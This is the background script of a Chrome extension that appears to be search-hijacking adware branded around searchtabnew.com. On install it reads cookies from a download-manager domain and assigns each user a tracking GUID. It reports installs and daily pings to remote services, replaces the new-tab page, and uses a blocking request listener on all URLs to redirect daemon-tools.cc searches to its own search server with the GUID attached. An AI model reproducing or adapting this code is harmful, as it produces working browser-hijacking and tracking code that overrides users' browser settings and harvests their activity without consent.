var TILIB=function(){	}
TILIB.prototype.StorageObjects=null;
TILIB.prototype.CookieObjects=null;
TILIB.prototype.Guid="";
TILIB.prototype.ServiceUrl="http://services.searchtabnew.com/";
TILIB.prototype.CookieDomain="files5.downloadmanager150.com";
TILIB.prototype.SourceId="";
TILIB.prototype.InstallBeginCall="";
TILIB.prototype.TrackingUrl="http://files5.filefly516.com/crxtracking";
TILIB.prototype.RegionCookieName="trcrx_region";
TILIB.prototype.DomainCookieName="trcrx_domain";
TILIB.prototype.PartnerCookieName="trcrx_partner_name";
TILIB.prototype.ParamKeyCookieName="trcrx_paramsKey";
TILIB.prototype.InstallPathCookieName="trcrx_install_path";
TILIB.prototype.ThankYouPageCookieName="trcrx_ty_url";
TILIB.prototype.ParamKeyCall="";
TILIB.prototype.UninstallUrl="http://searchtabnew.com/srd2/?id=334037bi10b29scy5jYy9ob21l&guid={guid}";
TILIB.prototype.DownloadUrl="";
TILIB.prototype.ping=function()
{
	var lastCall=this.getSetting("lastCall","");
	var canCall=false;
	if (typeof(lastCall)=='undefined')
		canCall=true;
	else
		if (lastCall=="")
			canCall=true;
	 else if (lastCall==null)
		 canCall=true;
	else
	{
		var now=new Date();
		var lastDate=new Date(lastCall);
		canCall=now.toDateString()!=lastDate.toDateString();
	}
	if (canCall)
	{
		var url=this.ServiceUrl+"general/ping.php?action=toolbar_is_alive&guid="+this.Guid;
		var req = this.getHttpRequest();
		req.onload = function(e)
		{
			window.TILIBInstance.setSetting("lastCall",new Date().toLocaleString());
		};
		req.open("GET", url, true);
		req.send();
	}
}
TILIB.prototype.getHttpRequest=function()
{
	var oReq = new XMLHttpRequest();
	return oReq;
}
TILIB.prototype.generateGuid=function()
{
	var result='xxxxxxxx-xxxx-xxxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
		var r = Math.random()*16|0, v = c == 'x' ? r : (r&0x3|0x8);
		return v.toString(16);
	});
	return result;
}
TILIB.prototype.OpenUrl=function(tabURL)
{
	chrome.tabs.create({ url: tabURL });
}
TILIB.prototype.getSetting=function(name,defValue)
{
	if (typeof this.StorageObjects.get(name) != 'undefined')
	{
		return this.StorageObjects.get(name);
	} else
	{
		if (typeof(defValue)==undefined)
			return "";
		else
			return defValue;
	}

}
TILIB.prototype.setSetting=function(name,value)
{
	this.StorageObjects.set(name,value);
	var setting = {};
	setting[name]=value;
	chrome.storage.local.set(setting);
}
TILIB.prototype.getCookie=function(name,defValue)
{
	if (typeof this.CookieObjects.get(name) != 'undefined')
	{
		return this.CookieObjects.get(name);
	}
	 else
	{
		if (typeof(defValue)==undefined)
			return "";
		else
			return defValue;
	}

}
TILIB.prototype.startup=function()
{
	var firstRun = this.getSetting("firstRun",true);
	var firstSearch = this.getSetting("firstSearch", true);
	if(firstRun)
	{
		this.Guid=this.generateGuid();
		this.setSetting("guid", this.Guid);
		this.setSetting("firstRun", false);
		if (this.CookieDomain!="")
		{
			var country="";
			var domain=this.getCookie(this.DomainCookieName,"daemon-tools.cc");
			var group=this.getCookie(this.PartnerCookieName,"daemon-tools");
			var paramKeyCookie="";
			country=this.getCookie(this.RegionCookieName,"");
			domain=this.getCookie(this.DomainCookieName,"");
			group=this.getCookie(this.PartnerCookieName,"");
			paramKeyCookie=this.getCookie(this.ParamKeyCookieName,"");
			var thankYouPage=this.getCookie(this.ThankYouPageCookieName,"");
			if (thankYouPage!="")
			{
				this.OpenUrl(decodeURIComponent(thankYouPage));
			}
			var downloadUrlCookie=this.getCookie(this.InstallPathCookieName,"");
			if (downloadUrlCookie!="")
			{
				this.DownloadUrl=decodeURIComponent(downloadUrlCookie);
				this.setSetting("DownloadUrl",this.DownloadUrl);
			}
			var url=this.ServiceUrl+"general/dynamic_toolbar.php?guid="+this.Guid+"&etype=c&g="+group+"&d="+domain+"&c="+country;
			this.InstallBeginCall=this.ServiceUrl+"general/ping.php?action=install_begin&guid="+this.Guid+"&source_id={sourceid}&source_type=crx";
			if (paramKeyCookie!="")
			{
				this.ParamKeyCall=this.TrackingUrl +"?paramsKey="+paramKeyCookie+"&guid="+this.Guid;
			}
			var req=this.getHttpRequest();
			var req_install = this.getHttpRequest();
			var req_paramKey = this.getHttpRequest();
			req.onload =function(e)
			{
				var json=req.responseText.replace('{"tbid":"','');
				json=json.replace('"}','');
				window.TILIBInstance.setSetting("sourceid",json);
				var install_url=window.TILIBInstance.InstallBeginCall.replace("{sourceid}",json);
				req_install.open("GET", install_url);
				req_install.send();
				if (window.TILIBInstance.ParamKeyCall!="")
				{
					console.log("ParamKeyCall call made to :"+window.TILIBInstance.ParamKeyCall);
					req_paramKey.open("POST", window.TILIBInstance.ParamKeyCall);
					req_paramKey.send();
				}
			};
			req.open("GET", url);
			req.send();
		}
		this.OpenUrl(chrome.extension.getURL("newtab/blank.html#newTab"));
	} else
	{
		this.Guid=this.getSetting("guid");
		this.DownloadUrl=this.getSetting("DownloadUrl");
	}
	var uninstall_url=this.UninstallUrl.replace("{guid}",this.Guid);
	chrome.runtime.setUninstallURL(uninstall_url, function (){});
	this.ping();
}
TILIB.prototype.loadCookies=function()
{
	chrome.cookies.getAll({domain:this.CookieDomain},function(cookies)
	{
		window.TILIBInstance.CookieObjects=new Map();
		for(var i=0;i<cookies.length;i++){
			window.TILIBInstance.CookieObjects.set(cookies[i].name,cookies[i].value);
		}
    });
}
TILIB.prototype.loadSettings=function()
{
	chrome.storage.local.get(function(storedItems)
	{
		window.TILIBInstance.StorageObjects=new Map();
		for(var key in storedItems) {
			window.TILIBInstance.StorageObjects.set(key,storedItems[key]);
		}
	});
}
var TILIBInstance=new TILIB();
window.TILIBInstance=TILIBInstance;
chrome.runtime.onStartup.addListener(function(){
	TILIBInstance.loadCookies();
	TILIBInstance.loadSettings();
	var intervalId=setInterval(function(){
		if (window.TILIBInstance.StorageObjects!=null && window.TILIBInstance.CookieObjects!=null)
		{
			clearInterval(intervalId);
			TILIBInstance.startup();
		}
	},500);
});
chrome.runtime.onInstalled.addListener(function(){
	TILIBInstance.loadCookies();
    TILIBInstance.loadSettings();
	var intervalId=setInterval(function(){
		if (window.TILIBInstance.StorageObjects!=null && window.TILIBInstance.CookieObjects!=null)
		{
			clearInterval(intervalId);
			TILIBInstance.startup();
		}
	},500);
});
chrome.tabs.onCreated.addListener(function created(tab)
{
	if (tab.url=="chrome://newtab/")
	{
		chrome.tabs.update(tab.id, {url: chrome.extension.getURL("newtab/blank.html")});
	}
});
chrome.runtime.onMessage.addListener(function(req, sender, sendResponse)
{
	var res = {};
    switch(req.task)
	{
		case "getGuid":
			res.Guid=TILIBInstance.Guid;
			sendResponse(res);
		break;
		case "getDownloadUrl":
			res.DownloadUrl=TILIBInstance.DownloadUrl;
			sendResponse(res);
		break;
		case "getDownloadUrlAfterInstall":
			if (TILIBInstance.getSetting("FirstRunPopUp",true))
			{
				res.DownloadUrl=TILIBInstance.DownloadUrl;
				TILIBInstance.setSetting("FirstRunPopUp",false);
				sendResponse(res);
			} else
			{
				res.DownloadUrl="";
				sendResponse(res);
			}
		break;
		case "openNewTabDialogWithInstall":
			TILIBInstance.CookieObjects=null;
			TILIBInstance.loadCookies();
			var intervalId=setInterval(function(){
				if (window.TILIBInstance.CookieObjects!=null)
				{
					clearInterval(intervalId);
					var downloadUrlCookie=TILIBInstance.getCookie(TILIBInstance.InstallPathCookieName,"");
					if (downloadUrlCookie!="")
					{
						TILIBInstance.DownloadUrl=decodeURIComponent(downloadUrlCookie);
						TILIBInstance.setSetting("DownloadUrl",TILIBInstance.DownloadUrl);
						TILIBInstance.setSetting("FirstRunPopUp",true);
						chrome.tabs.query({url:"chrome://newtab/"},function(tabs)
						{
							for (i=0;i<tabs.length;i++)
							chrome.tabs.remove(tabs[i].id,function(){});
						});
						chrome.tabs.getSelected(null, function(tab) {
							 chrome.tabs.update(tab.id, {url: chrome.extension.getURL("newtab/blank.html")});
						});

					}
				}
			},500);
		break;
	}
});
chrome.browserAction.onClicked.addListener(function ()
{
	TILIBInstance.OpenUrl(chrome.extension.getURL("newtab/blank.html"));
});
chrome.webRequest.onBeforeRequest.addListener(function(details)
{

	var url = details.url;
	var a = document.createElement('a');
    a.href = url;
	if(url.indexOf("http://daemon-tools.cc/search/")!=-1)
	{
		// if(TILIBInstance.getSetting("firstSearch", true)){
		// 	// alert('yo');
		// 	chrome.runtime.sendMessage({task:"openFirstSearchModal"}, function(res){
		// 		// var guid = res.Guid;
		// 		// $("#guid_field").val(guid);
		// 	});
		// 	return { cancel: true };
		// }
		var keys=a.pathname.split('/');
		var keyword=decodeURIComponent(keys[keys.length-1]);
		TILIBInstance.setSetting("firstSearch", false);
		return {redirectUrl:"http://services.searchtabnew.com/crx/search.php?k="+keyword+"&guid="+TILIBInstance.Guid};
	}
	// return {redirectUrl:url};
},
{
	urls: [ '*://*/*' ], // Pattern to match all http(s) pages
	types: [ 'main_frame','sub_frame' ]
},
['blocking']);
